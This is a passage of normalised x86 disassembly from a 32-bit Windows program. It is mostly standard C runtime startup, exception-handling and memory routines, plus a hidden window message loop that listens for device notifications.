mov [ ebp - 0x10 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x40 ]
lea edx [ ebp - 0x14 ]
push eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] sub_403570
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] edx
call [ RegisterClassW@IAT ]
test ax ax
jne r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov ecx [ rw-data ]
push esi
push ecx
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push r--data
lea edx [ ebp - 0x14 ]
push edx
push esi
call [ CreateWindowExW@IAT ]
mov [ rw-data ] eax
cmp eax esi
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov edx [ rw-data ]
lea ecx [ ebp - 0x18 ]
push ecx
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ rw-data ]
mov [ ecx + 0x4 ] edx
mov edx [ rw-data ]
mov [ ecx + 0x8 ] edx
mov edx [ rw-data ]
push eax
mov [ ecx + 0xc ] edx
call sub_403630
test eax eax
je r-xdata
push esi
push esi
push esi
mov esi [ GetMessageW@IAT ]
lea eax [ ebp - 0x5c ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ UnregisterDeviceNotification@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x54 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov edi [ TranslateMessage@IAT ]
mov ebx [ DispatchMessageW@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
call edi
lea edx [ ebp - 0x5c ]
push edx
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x5c ]
push eax
call esi
test eax eax
jne r-xdata
sub_403840
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_403ee8
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_4038c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4038f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_403924
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_403960
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40382c
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40382c
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_403c2b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_403be2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40382c
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40382c
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_403c12
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_403c2b
mov eax [ ebp + 0xc ]
push rw-data
call sub_404050
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40382c
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_403bf9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40382c
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_403af0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_403b80
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_404225
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_404244
jmp r-xdata
sub_403b80
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40382c
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_403af0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_403be2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_403c12
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_403c6b
push 0x58
push r--data
call sub_405430
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_405406
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_40528b
test eax eax
jne r-xdata
push 0x1c
call sub_403c42
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_404f46
mov [ ebp - 0x4 ] esi
call sub_404d01
test eax eax
jns r-xdata
push 0x10
call sub_403c42
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_404c6a
mov [ rw-data ] eax
call sub_404baf
test eax eax
jns r-xdata
push 0x1b
call sub_404564
call sub_404939
test eax eax
jns r-xdata
push 0x8
call sub_404564
push 0x1
call sub_404343
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_404564
call sub_4048da
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_404564
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_404546
jmp sub_403dc8
push eax
call sub_40451a
push ecx
push eax
push esi
push __dos_header
call sub_402f60
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_403de2
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_405524
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_405524
pop ecx
sub_403ee8
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_403fc0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_404000
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_404050
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403960
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_403fc0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_404000
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404110
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404130
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40382c
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_404175
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_404175
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_404130
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_404225
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_404244
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_404225
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_404247
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40552c
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_404297
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_4042ec
mov edi edi
push esi
call sub_404f92
mov esi eax
push esi
call sub_405ae0
push esi
call sub_405946
push esi
call sub_405937
push esi
call sub_405928
push esi
call sub_405723
push esi
call sub_405565
add esp 0x18
pop esi
retn
sub_40431f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_404343
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_405ca6
push r--data
push r--data
call sub_40431f
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_404050
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_404f6c
call sub_405c8f
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_404050
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4043da
push 0x20
push r--data
call sub_405430
push 0x8
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404505
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_405475
retn
mov [ rw-data ] 0x1
push 0x8
call sub_405617
pop ecx
push [ ebp + 0x8 ]
call sub_4042c2
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_404f92
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_404f92
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_404582
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_4045a8
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_404582
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40382c
leave
retn
push 0x3
call sub_406087
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_406087
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_406024
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_405cd0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_405a7e
push esi
call sub_406009
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_406024
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_405ec7
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_406009
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_405f3c
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_405ec7
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_405d5b
add esp 0xc
jmp r-xdata
sub_404757
push 0x3
call sub_406087
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4045a8
push 0xff
call sub_4045a8
pop ecx
pop ecx
push 0x3
call sub_406087
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_404790
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4050c9
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4048da
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40687e
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_4061a0
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_404939
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40687e
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40697a
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_405cd0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_405cd0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_40689c
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40697a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_40689c
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_4068d6
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405a7e
int3
add edi 0x4
sub_404a15
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4061a0
pop ecx
test eax eax
